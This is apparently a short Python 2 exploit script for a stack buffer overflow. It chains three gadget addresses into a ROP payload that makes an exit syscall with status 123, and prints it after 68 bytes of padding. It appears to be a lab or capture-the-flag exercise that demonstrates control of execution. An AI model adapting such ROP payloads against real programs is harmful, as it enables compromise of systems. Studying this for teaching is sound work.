import struct

pop_eax = struct.pack("<I", 0x080484e7)
pop_ebx = struct.pack("<I", 0x08048309)
int_80  = struct.pack("<I", 0x0804852f)

rop_chain = pop_eax
rop_chain += struct.pack("<I", 1)
rop_chain += pop_ebx
rop_chain += struct.pack("<I", 123)
rop_chain += int_80

#print rop_chain.encode("hex")

print "A"*64 + "B"*4 + rop_chain
